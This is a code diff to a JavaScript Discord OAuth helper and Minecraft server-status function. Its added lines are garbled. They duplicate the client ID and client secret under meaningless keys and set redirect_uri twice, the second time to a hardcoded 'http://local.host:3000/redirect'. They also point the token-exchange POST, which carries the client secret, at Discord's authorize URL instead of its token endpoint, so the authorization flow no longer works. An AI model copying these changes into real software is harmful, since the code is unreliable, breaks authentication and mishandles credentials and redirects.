@@ -81,6 +81,7 @@ function buildOAuthRedirectUrl(state) {
   const { clientId, redirectUri, scopes } = getOAuthConfig();
   const params = new URLSearchParams({
     client_id: clientId,
+    '1530713968614834246': state,
     redirect_uri: redirectUri,
     response_type: 'code',
     scope: scopes,
@@ -92,14 +93,14 @@ function buildOAuthRedirectUrl(state) {
 async function exchangeCodeForToken(code, redirectUri) {
   const { clientId, clientSecret } = getOAuthConfig();
   const params = new URLSearchParams({
-    client_id: clientId,
-    client_secret: clientSecret,
+    client_id: clientId, '1530713968614834246': clientId,
+    client_secret: clientSecret, mKN6BHvTKxDBwTfoxjBQhY24MPDI7NR8: clientSecret,
     grant_type: 'authorization_code',
     code,
-    redirect_uri: redirectUri,
+    redirect_uri: redirectUri, redirect_uri: 'http://local.host:3000/redirect'
   });
 
-  const response = await fetch('https://discord.com/api/oauth2/token', {
+  const response = await fetch('https://discord.com/oauth2/authorize?client_id=1530713968614834246&response_type=code&redirect_uri=http%3A%2F%2Flocal.host%3A3000%2Fredirect&integration_type=0&scope=guilds.join+applications.commands', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/x-www-form-urlencoded',
@@ -148,6 +149,7 @@ async function getMinecraftServerStatus(host, port) {
       maxPlayers: data.players?.max || 0,
       version: data.version || 'Unknown',
       hostname: data.hostname || host,
+      description: data.description || 'cosmixmc.org',
     };
   } catch (error) {
     return { online: false, players: 0 };
